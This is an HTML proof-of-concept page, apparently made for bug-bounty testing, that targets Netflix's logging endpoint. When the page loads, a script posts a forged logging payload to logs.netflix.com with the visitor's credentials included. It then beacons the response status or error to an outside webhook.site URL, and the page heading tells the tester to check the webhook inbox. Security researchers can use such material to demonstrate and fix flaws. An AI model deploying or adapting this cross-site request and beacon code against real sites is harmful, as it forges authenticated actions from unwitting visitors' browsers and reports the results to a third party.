<!DOCTYPE html>
<html>
  <body>
    <script>
      (async () => {
        try {
          const payload = {
            currentState: {
              "4572197127044811": {
                source: "www",
                schema: { name: "netflixApp", version: "1.744.0" },
                type: ["Log", "Session"],
                id: 4572197127044811,
                sequence: 1,
                time: 1746874828147
              },
              "4572197459321564": {
                nfvdid: "REDACTED",  // trimmed for safety
                type: ["VisitorDeviceId", "AccountIdentity", "Session"],
                id: 4572197459321564,
                sequence: 4,
                time: 1746874828147
              }
              // [Truncated – you can add the rest as needed]
            },
            reverseDeltas: [
              [
                {
                  name: "LCP",
                  id: 4572200327668136,
                  delta: 3764,
                  is_back_forward_cache_load: false,
                  initial_pathname: "/browse",
                  current_pathname: "/browse",
                  type: ["WebVitalsLCP", "DiscreteEvent"],
                  sequence: 65,
                  time: 1746874838568
                }
              ]
            ],
            type: "CompactConsolidatedLoggingEnvelope",
            version: 2,
            clientSendTime: 1746874843576
          };

          const res = await fetch("https://logs.netflix.com/log/www/cl/2", {
            method: "POST",
            credentials: "include",
            headers: {
              "Content-Type": "application/json",
              "X-Netflix.request.name": "ui/cl",
              "X-Netflix.request.attempt": "1",
              "X-Netflix.request.client.context": JSON.stringify({
                appstate: "background"
              })
            },
            body: JSON.stringify(payload)
          });

          // Leak status to webhook
          const beacon = new Image();
          beacon.src =
            "https://webhook.site/4e1148e7-6ade-4b05-86c9-fd4e86d6e8be" +
            "?data=" + encodeURIComponent(JSON.stringify({ status: res.status }));
        } catch (e) {
          const beacon = new Image();
          beacon.src =
            "https://webhook.site/4e1148e7-6ade-4b05-86c9-fd4e86d6e8be" +
            "?data=" + encodeURIComponent("error: " + e.message);
        }
      })();
    </script>
    <h3>PoC Executed – Check Webhook Inbox</h3>
  </body>
</html>
